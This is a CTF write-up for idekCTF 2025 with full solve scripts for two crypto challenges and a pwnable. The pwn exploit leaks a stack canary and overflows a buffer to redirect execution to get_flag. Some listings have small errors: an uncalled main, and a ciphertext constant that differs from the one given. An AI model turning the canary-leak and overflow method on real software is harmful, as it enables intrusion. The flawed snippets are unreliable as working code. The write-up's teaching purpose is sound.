---
title: "idekCTF 2025"
description: "Writeup for Crypto, Pwn Challenge"
summary: "Writeup for Crypto, Pwn Challenge"
categories: ["Writeup"]
tags: ["Crypto", "Pwnable"]
#externalUrl: ""
date: 2025-08-04
draft: false
authors:
  - ducnocrypt
cover: "images/post_covers/idekctf2025.png"
---


During the weekend, I participated in Idek CTF... which is something new to me 😅 

## CryptoGraphy 



### Catch
![Ảnh chụp màn hình 2025-08-04 020941](https://hackmd.io/_uploads/B127V4pvxl.png)

**Challenge:** In this 20-round challenge, we must find the secret sequence of matrix transformations a "cat" uses to move from a starting coordinate to a final one.

chall.py
```python
from Crypto.Random.random import randint, choice
import os

# In a realm where curiosity roams free, our fearless cat sets out on an epic journey.
# Even the cleverest feline must respect the boundaries of its world—this magical limit holds all wonders within.
limit = 0xe5db6a6d765b1ba6e727aa7a87a792c49bb9ddeb2bad999f5ea04f047255d5a72e193a7d58aa8ef619b0262de6d25651085842fd9c385fa4f1032c305f44b8a4f92b16c8115d0595cebfccc1c655ca20db597ff1f01e0db70b9073fbaa1ae5e489484c7a45c215ea02db3c77f1865e1e8597cb0b0af3241cd8214bd5b5c1491f

# Through cryptic patterns, our cat deciphers its next move.
def walking(x, y, part):
    # Each step is guided by a fragment of the cat's own secret mind.
    epart = [int.from_bytes(part[i:i+2], "big") for i in range(0, len(part), 2)]
    xx = epart[0] * x + epart[1] * y
    yy = epart[2] * x + epart[3] * y
    return xx, yy

# Enter the Cat: curious wanderer and keeper of hidden paths.
class Cat:
    def __init__(self):
        # The cat's starting position is born of pure randomness.
        self.x = randint(0, 2**256)
        self.y = randint(0, 2**256)
        # Deep within, its mind holds a thousand mysterious fragments.
        while True:
            self.mind = os.urandom(1000)
            self.step = [self.mind[i:i+8] for i in range(0, 1000, 8)]
            if len(set(self.step)) == len(self.step):
                break

    # The epic chase begins: the cat ponders and strides toward the horizon.
    def moving(self):
        for _ in range(30):
            # A moment of reflection: choose a thought from the cat's endless mind.
            part = choice(self.step)
            self.step.remove(part)
            # With each heartbeat, the cat takes a cryptic step.
            xx, yy = walking(self.x, self.y, part)
            self.x, self.y = xx, yy
            # When the wild spirit reaches the edge, it respects the boundary and pauses.
            if self.x > limit or self.y > limit:
                self.x %= limit
                self.y %= limit
                break

    # When the cosmos beckons, the cat reveals its secret coordinates.
    def position(self):
        return (self.x, self.y)

# Adventurer, your quest: find and connect with 20 elusive cats.
for round in range(20):
    try:
        print(f"👉 Hunt {round+1}/20 begins!")
        cat = Cat()

        # At the start, you and the cat share the same starlit square.
        human_pos = cat.position()
        print(f"🐱✨ Co-location: {human_pos}")
        print(f"🔮 Cat's hidden mind: {cat.mind.hex()}")

        # But the cat, ever playful, dashes into the unknown...
        cat.moving()
        print("😸 The chase is on!")

        print(f"🗺️ Cat now at: {cat.position()}")

        # Your turn: recall the cat's secret path fragments to catch up.
        mind = bytes.fromhex(input("🤔 Path to recall (hex): "))

        # Step by step, follow the trail the cat has laid.
        for i in range(0, len(mind), 8):
            part = mind[i:i+8]
            if part not in cat.mind:
                print("❌ Lost in the labyrinth of thoughts.")
                exit()
            human_pos = walking(human_pos[0], human_pos[1], part)

        # At last, if destiny aligns...
        if human_pos == cat.position():
            print("🎉 Reunion! You have found your feline friend! 🐾")
        else:
            print("😿 The path eludes you... Your heart aches.")
            exit()
    except Exception:
        print("🙀 A puzzle too tangled for tonight. Rest well.")
        exit()

# Triumph at last: the final cat yields the secret prize.
print(f"🏆 Victory! The treasure lies within: {open('flag.txt').read()}")
```
#### Analysis

The core of the challenge is a linear transformation. In each step, the cat's 2D position vector $v_{old}$ is multiplied by a $2 \times 2$ matrix $M$ to get its new position $v_{new}$:

$$\begin{pmatrix} x_{new} \\ y_{new} \end{pmatrix} = M \begin{pmatrix} x_{old} \\ y_{old} \end{pmatrix}$$

For each round, we are given:
* An initial position $v_0 = (x_0, y_0)$.
* A final position $v_f = (x_f, y_f)$.
* A set of 125 unique 8-byte "parts," each corresponding to a unique $2 \times 2$ transformation matrix $M$.

The script reveals that the cat performs **30 unique, randomly chosen transformations** in sequence. If the sequence of matrices is $M_1, M_2, \ldots, M_{30}$, the final position is:

$$v_f = M_{30} \cdot M_{29} \cdot \ldots \cdot M_1 \cdot v_0$$

A `limit` check in the code seems to suggest the coordinates might be taken modulo a large number. However, a quick analysis of the bit-length growth shows that the coordinates never grow large enough in 30 steps to exceed the `limit`. Thus, the modulo operation is a red herring, and the problem is purely over the integers.

The primary difficulty is the massive search space. Finding the correct ordered subset of 30 matrices from 125 ($P(125, 30) = \frac{125!}{95!}$) is impossible by brute force.



#### Recursive Backtracking 

The vulnerability lies in the fact that every intermediate step must result in a vector with **integer coordinates**. This allows us to work backward from the final position.

Let $v_{29}$ be the position just before the final step. The final transformation is $v_f = M_{30} \cdot v_{29}$. We can solve for the previous state $v_{29}$ by inverting the matrix $M_{30}$:

$$v_{29} = M_{30}^{-1} \cdot v_f$$

The inverse of a $2 \times 2$ matrix is $M^{-1} = \frac{1}{\det(M)} \cdot \text{adj}(M)$. For $v_{29}$ to have integer coordinates, the vector multiplication $\text{adj}(M_{30}) \cdot v_f$ must produce a result that is component-wise divisible by $\det(M_{30})$.

This gives us a highly effective way to find the last matrix, $M_{30}$:
1.  Iterate through all 125 possible matrices.
2.  For each candidate matrix $M_i$, check if $\text{adj}(M_i) \cdot v_f$ is divisible by $\det(M_i)$.
3.  The probability of this check passing for an incorrect matrix is extremely low. The one that passes is almost certainly the true $M_{30}$.

Once we find $M_{30}$ and calculate the integer coordinates for $v_{29}$, we can repeat the process recursively to find $M_{29}$, and so on, until we have uncovered the entire 30-step path from $v_0$. This backtracking approach prunes the search tree so effectively that the solution is found almost instantly.


#### Solution

exploit.py
```python
from pwn import *
HOST = "catch.chal.idek.team"
PORT = 1337

# Memoization cache for the recursive solver
memo = {}
def get_matrix_from_part(part: bytes) -> list[int]:
    """Parses an 8-byte part into four 2-byte integers."""
    return [int.from_bytes(part[i:i+2], "big") for i in range(0, len(part), 2)]

def find_path(v_start: tuple, v_end: tuple, parts_map: dict, k: int) -> list | None:
    """
    Recursively finds the sequence of k parts to get from v_start to v_end.
    """
    # Memoization key: (start_pos, end_pos, available_parts_tuple, num_steps)
    state = (v_start, v_end, tuple(sorted(parts_map.keys())), k)
    if state in memo:
        return memo[state]
    if k == 0:
        return [] if v_start == v_end else None
    x_start, y_start = v_start
    x_end, y_end = v_end

    # Search backwards from v_end
    for part_hex, part_bytes in parts_map.items():
        e = get_matrix_from_part(part_bytes)
        # M = [[e0, e1], [e2, e3]]
        det = e[0] * e[3] - e[1] * e[2]
        if det == 0:
            continue
        # Calculate potential previous state: v_prev = adj(M) * v_end
        x_prev_num = e[3] * x_end - e[1] * y_end
        y_prev_num = -e[2] * x_end + e[0] * y_end
        # Check for integer coordinates, which is the key constraint
        if x_prev_num % det == 0 and y_prev_num % det == 0:
            x_prev = x_prev_num // det
            y_prev = y_prev_num // det
            # Recurse with the smaller problem
            remaining_parts = parts_map.copy()
            del remaining_parts[part_hex]
            path_result = find_path((x_start, y_start), (x_prev, y_prev), remaining_parts, k - 1)
            if path_result is not None:
                # Path found, construct solution and store in memo
                solution = path_result + [part_bytes]
                memo[state] = solution
                return solution
    # No path found from this state
    memo[state] = None
    return None

def solve_round(io: remote):
    """Parses a round's data and initiates the solver."""
    io.recvuntil(b"Co-location: (")
    x0 = int(io.recvuntil(b",", drop=True))
    y0 = int(io.recvuntil(b")", drop=True))
    io.recvuntil(b"Cat's hidden mind: ")
    mind_hex = io.recvline().strip().decode()
    io.recvuntil(b"Cat now at: (")
    xf = int(io.recvuntil(b",", drop=True))
    yf = int(io.recvuntil(b")", drop=True))
    mind_bytes = bytes.fromhex(mind_hex)
    parts_map = {mind_bytes[i:i+8].hex(): mind_bytes[i:i+8] for i in range(0, len(mind_bytes), 8)}
    
    k = 30
    log.info(f"Solving for k={k} steps...")
    path = find_path((x0, y0), (xf, yf), parts_map, k)
    
    if path:
        solution_hex = b"".join(path).hex()
        log.success("Path found!")
        # pwntools handles str->bytes encoding automatically, no b"" needed for the prompt
        io.sendlineafter("🤔 Path to recall (hex): ".encode(), solution_hex.encode())
    else:
        log.error("Failed to find a path for this round.")
        io.close()

def main():
    """Main function to run the solver for all rounds."""
    with remote(HOST, PORT) as io:
        for i in range(20):
            log.info(f"--- Starting Round {i + 1}/20 ---")
            memo.clear()  # Clear memoization cache for each new round
            solve_round(io)
            log.info(io.recvline().strip().decode()) # Print success message
        
        flag = io.recvall().decode()
        log.success(flag)

if __name__ == "__main__":
    main
```
![Ảnh chụp màn hình 2025-08-04 021204](https://hackmd.io/_uploads/SyKCVEpPxl.png)

> Flag: idek{Catch_and_cat_sound_really_similar_haha}

---

### Diamond Ticket

![Ảnh chụp màn hình 2025-08-05 114247](https://hackmd.io/_uploads/BJM-3WyOge.png)



This crypto challenge was a fun, multi-stage problem involving a common modulus attack, a tricky discrete logarithm problem solved with polynomial GCDs, and finally, a lattice attack to recover the full flag from partial information.

chall.py

```python
from Crypto.Util.number import *

#Some magic from Willy Wonka
p = 170829625398370252501980763763988409583
a = 164164878498114882034745803752027154293
b = 125172356708896457197207880391835698381

def chocolate_generator(m:int) -> int:
    return (pow(a, m, p) + pow(b, m, p)) % p

#The diamond ticket is hiding inside chocolate
diamond_ticket = open("flag.txt", "rb").read()
assert len(diamond_ticket) == 26
assert diamond_ticket[:5] == b"idek{"
assert diamond_ticket[-1:] == b"}"
diamond_ticket = bytes_to_long(diamond_ticket[5:-1])

flag_chocolate = chocolate_generator(diamond_ticket)
chocolate_bag = []

#Willy Wonka are making chocolates
for i in range(1337):
    chocolate_bag.append(getRandomRange(1, p))

#And he put the golden ticket at the end
chocolate_bag.append(flag_chocolate)

#Augustus ate lots of chocolates, but he can't eat all cuz he is full now :D
remain = chocolate_bag[-5:]

#Compress all remain chocolates into one
remain_bytes = b"".join([c.to_bytes(p.bit_length()//8, "big") for c in remain])

#The last chocolate is too important, so Willy Wonka did magic again
P = getPrime(512)
Q = getPrime(512)
N = P * Q
e = bytes_to_long(b"idek{this_is_a_fake_flag_lolol}")
d = pow(e, -1, (P - 1) * (Q - 1))
c1 = pow(bytes_to_long(remain_bytes), e, N)
c2 = pow(bytes_to_long(remain_bytes), 2, N) # A small gift

#How can you get it ?
print(f"{N = }")
print(f"{c1 = }")
print(f"{c2 = }") 

"""
N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867
c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301
c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649
"""
```

#### Part 1: Recovering the Message recovering remain_bytes


We are given two ciphertexts under the same modulus $N$:
- $c_1 = rb^e \bmod N$
- $c_2 = rb^2 \bmod N$

Since $e$ and $2$ are coprime, this is a classic common modulus attack. We use the Extended Euclidean Algorithm to find integers $x$ and $y$ such that $e x + 2 y = 1$. With $x$ and $y$, we can recover $rb$ directly:

$$
rb = (c_1^x \cdot c_2^y) \bmod N
$$

The last 16 bytes of $rb$ correspond to `flag_chocolate`.

```python
from Crypto.Util.number import *

N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867
c1 = 270620741968344586701914221208574562179793084403329285637849611019789484663682988027659730203494331217267365368992605048283888992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301
c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649
e = bytes_to_long(b"idek{this_is_a_fake_flag_lolol}")

x = 1
y = (1 - e) // 2

rb = pow(c1, x, N) * pow(c2, y, N) % N
flag_chocolate = bytes_to_long(rb.to_bytes(80, "big")[-16:])
```

#### Part 2: Solving the Discrete Log 

After recovering `flag_chocolate` (let's call it `fc`), we had to solve for the diamond ticket ($m$):

$$
a^m + b^m \equiv fc \pmod p
$$

Here, $b$ is some power of $a$: $b = a^j \pmod p$. Substitute and let $s = a^m$:

$$
s^j + s - fc \equiv 0 \pmod p
$$

This polynomial is infeasible to solve by brute force for large $j$. By Fermat's Little Theorem, any solution $s$ must satisfy $s^p \equiv s \pmod p$. So, compute the GCD:

$$
H(s) = \gcd(s^j + s - fc, s^p - s) \pmod p
$$

The roots of $H(s)$ are the possible $s = a^m$.

```python
# SageMath code
p = 170829625398370252501980763763988409583
a = 164164878498114882034745803752027154293
b = 125172356708896457197207880391835698381
flag_chocolate = 99584795316725433978492646071734128819

Fp = GF(p)
j = Fp(b).log(Fp(a)) # j = 73331

x = polygen(Fp)
f = x**j + x - flag_chocolate
g = pow(x, p, f) - x

roots = f.gcd(g).roots()
s = roots[0][0]
m_low = int(Fp(s).log(Fp(a)))
```
*I learned this trick from https://adib.au/2025/lance-hard/#speedup-by-using-gcd and met it again at MaltaCTF 2025 Quals - grammar-nazi. Really cool trick to know!*

#### Part 3: Finding the Golden Ticket

The discrete log $m_\text{low}$ gives us the solution modulo $p-1$ (128 bits). The flag is 20 bytes (160 bits), so we need to find the missing upper 32 bits.

We know:

$$
\text{flag} = m_\text{low} + k \cdot (p-1)
$$

Since the flag is a printable ASCII string, we use a lattice reduction (LLL) attack to efficiently search for the correct $k$.

- Construct a lattice encoding the flag structure.
- Use LLL to find short vectors corresponding to printable flags.
- Check candidates for ASCII-printability.

```python
from sage.all import *
from Crypto.Util.number import *
from cpmpy import *

order = p - 1
flag_byte_len = 20

nn = (p - 1) // 2
xx = m_low

for ii in range(2):
    x_candidate = xx + ii * nn

    B = Matrix(ZZ, flag_byte_len + 1, flag_byte_len + 1)
    B[0,0] = 1
    for i in range(flag_byte_len):
        B[i+1, i] = 1
        B[0, i+1] = -(256**i)
    B[0, flag_byte_len] = x_candidate
    B[flag_byte_len, flag_byte_len] = order

    L = B.LLL()
    for row in L:
        flag_bytes = b""
        possible = True
        for val in row[:-1]:
            if 32 <= val <= 126:
                flag_bytes += int(val).to_bytes(1, 'big')
            else:
                possible = False
                break
        if possible and len(flag_bytes) == flag_byte_len:
            print(f"[+] Found potential flag: {flag_bytes.decode()}")
            if "tks" in flag_bytes.decode():
                print(f"\n[!] Final Flag: idek{{{flag_bytes.decode()}}}")
                exit()
```




#### Solution

```python
# Full exploit script requires SageMath environment
from sage.all import *
from Crypto.Util.number import *

N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867
c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301
c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649

e = bytes_to_long(b"idek{this_is_a_fake_flag_lolol}")

Zn = Zmod(N)
PR, x = PolynomialRing(Zn, 'x').objgen()
f2 = x**2 - c2
QR, y = PR.quotient(f2, 'y').objgen()
f1 = y**e - c1

flag_chocolate = bytes_to_long(int(-f1[0]/f1[1]).to_bytes(128, "big")[-16:])
print(f"{flag_chocolate = }")

p = 170829625398370252501980763763988409583
a = 164164878498114882034745803752027154293
b = 125172356708896457197207880391835698381

Fp = GF(p)
j = Fp(b).log(Fp(a))
print(f"{j = }")
x = polygen(Fp)
print("Calculate f")
f = x**j + x - flag_chocolate
print("Calculate g")
g = pow(x, p, f) - x
print("Gcd")
roots = f.gcd(g).roots()
print(roots)

rlog = []
for c, _ in roots:
    try:
        rlog.append(int(Fp(c).log(Fp(a))))
        print(c)
    except:
        continue

print(len(rlog))

from cpmpy import *
import re

nn = 85414812699185126250990381881994204791
xx = rlog[0]

for ii in range(10):
    x = xx + ii * nn
    print(x)
    M = matrix(20, 20)
    M[0,0] = p - 1
    for i in range(19):
        M[i+1,i:i+2] = [[-256, 1]]

    M = M.LLL().rows()
    x_vec = [(x >> 8*i) & 0xff for i in range(20)]
    M += [tuple(x_vec)]
    m = Matrix(M)

    def disp():
        flag = bytes(x.value())[-8::-8].decode()
        if re.fullmatch(r'\w+', flag):
            print(flag, '<--- WIN')
        else:
            print(flag)
        
    x = cpm_array(list(intvar(-9999, 9999, 20)) + [1]) @ m[:]
    Model([x >= 32, x <= 122]).solveAll(display=disp)
```


After running the lattice attack, the script finds the plaintext: `tks_f0r_ur_t1ck3t_xD`  --> you win
![Ảnh chụp màn hình 2025-08-05 115258](https://hackmd.io/_uploads/rk8PAZ1_lx.png)

> Flag: idek{tks_f0r_ur_t1ck3t_xD}

*I love author [Giáp](https://giapppp.github.io/)* 🥰

## Pwn

![Ảnh chụp màn hình 2025-08-04 030338](https://hackmd.io/_uploads/HJk0lrpwxx.png)

This challenge requiring the player to exploit a C program to gain control and read the contents of the flag file. The solution involves chaining two common vulnerabilities: an information leak to bypass the stack canary protection and a buffer overflow to hijack the program's control flow.



### Vulnerability Analysis

After analyzing the program's source code and behavior, we identified two critical security vulnerabilities:

#### Vuln 1: Stack Buffer Overflow

The main vulnerability lies in the `edit_friend` function

![Ảnh chụp màn hình 2025-08-04 111026](https://hackmd.io/_uploads/HyUbQnavgg.png)


```c
void edit_friend(char (*top_friends)[8]) {
  // ...
  puts("Enter new name: ");
  fgets(top_friends[iVar2], 0x100, stdin); // VULN IS HERE
  // ...
}
```

- The `fgets` function is configured to read up to 0x100 (256) bytes of data from the user.
- However, the destination buffer is only 8 bytes, leading to a **stack buffer overflow**.
- This allows overwriting the **saved RBP** and **return address**.


#### Vuln 2: Information Leak

To bypass the stack canary protection, exploit another in the `display_friend` function 

![Ảnh chụp màn hình 2025-08-04 111136](https://hackmd.io/_uploads/ryPE7npwgx.png)


```c
void display_friend(char (*top_friends)[8]) {
  // ... (gets index from user)
  write(1, top_friends + iVar2, 8); // VULN IS HERE
  // ...
}
```

- This function prints exactly 8 bytes from the selected memory region.
- Due to a possible **index validation bug** (e.g., signed/unsigned comparison), it’s possible to **read out-of-bounds** memory.
- This enables leaking the **stack canary** located at `rbp - 0x8`.

#### Another func 

`main`
```c
/* WARNING: Unknown calling convention */

int main(void)

{
  long lVar1;
  int iVar2;
  long in_FS_OFFSET;
  int option;
  char top_friends [8] [8];
  char buf [40];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("I really miss MySpace. At least the part about ranking my friends. Let\'s recreate it!");
  builtin_strncpy(top_friends[0],"es3n1n",7);
  top_friends[0][7] = '\0';
  builtin_strncpy(top_friends[1],"Zero",5);
  top_friends[1][5] = '\0';
  top_friends[1][6] = '\0';
  top_friends[1][7] = '\0';
  builtin_strncpy(top_friends[2],"Contron",8);
  builtin_strncpy(top_friends[3],"mixy1",6);
  top_friends[3][6] = '\0';
  top_friends[3][7] = '\0';
  builtin_strncpy(top_friends[4],"JoshL",6);
  top_friends[4][6] = '\0';
  top_friends[4][7] = '\0';
  builtin_strncpy(top_friends[5],"Giapppp",8);
  builtin_strncpy(top_friends[6],"Icesfont",8);
  builtin_strncpy(top_friends[7],"arcticx",8);
LAB_00401636:
  menu();
  fgets(buf,0x28,stdin);
  iVar2 = FUN_00401160(buf);
  if (iVar2 == 4) {
    if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  if (iVar2 < 5) {
    if (iVar2 == 3) {
      display_friend(top_friends);
      goto LAB_00401636;
    }
    if (iVar2 < 4) {
      if (iVar2 == 1) {
        all_friends(top_friends);
      }
      else {
        if (iVar2 != 2) goto LAB_004016cd;
        edit_friend(top_friends);
      }
      goto LAB_00401636;
    }
  }
LAB_004016cd:
  puts("Invalid option.");
  goto LAB_00401636;
}


```

`get_flag`

![Ảnh chụp màn hình 2025-08-04 111305](https://hackmd.io/_uploads/B15tQn6wxg.png)


###  Exploit 

The attack is carried out in two main stages:

####  Stage 1: Leak the Stack Canary

- Call `display_friend` (option 3).
- The canary is located at offset `(0x70 - 0x8)/8 = 13`.
- Input index = 13 to leak it.
- The program prints `Invalid index!` before printing the canary — skip this line and read the next 8 bytes.

####  Stage 2: Buffer Overflow and Hijack Control Flow

- Call `edit_friend` (option 2).
- Create a payload:
  - 104 bytes padding
  - 8-byte canary
  - 8-byte filler for saved RBP
  - 8-byte address of `get_flag` function (`0x40129d`)
- Quit the program → `main` returns → control jumps to `get_flag()` → reads the flag.


### Solution
exploit.py

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./myspace2', checksec=False)
p = remote('myspace2.chal.idek.team', 1337)

#  STEP 1: LEAK THE STACK CANARY
log.info("Leaking the stack canary...")
p.sendlineafter(b'>> ', b'3')
p.sendlineafter(b'(0-7): ', b'13')  # index 13 to leak canary
p.recvuntil(b'Invalid index!\n')    # skip the error message
canary = u64(p.recvn(8))
log.success(f"Canary leaked successfully: {hex(canary)}")

#  STEP 2: CRAFT PAYLOAD AND OVERWRITE
get_flag_address = elf.symbols['get_flag']
log.info("Crafting the exploit payload...")
payload = flat([
    b'A' * 104,       # padding
    canary,           # leaked canary
    b'B' * 8,         # filler for saved RBP
    get_flag_address  # return address → get_flag
])
log.info(f"Payload ready. Redirecting execution to get_flag() at {hex(get_flag_address)}")
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'(0-7): ', b'0')  # any index
p.sendlineafter(b'new name: ', payload)

#  STEP 3: TRIGGER AND GET THE FLAG
log.info("Triggering exploit by quitting the program...")
p.sendlineafter(b'>> ', b'4')
flag = p.recvall().decode().strip()
log.success(f"Exploit successful! FLAG: {flag}")
```


![Ảnh chụp màn hình 2025-08-04 010405](https://hackmd.io/_uploads/HkwiWBTDgg.png)

> Flag: idek{b4bys_1st_c00k1e_leak_yayyy!}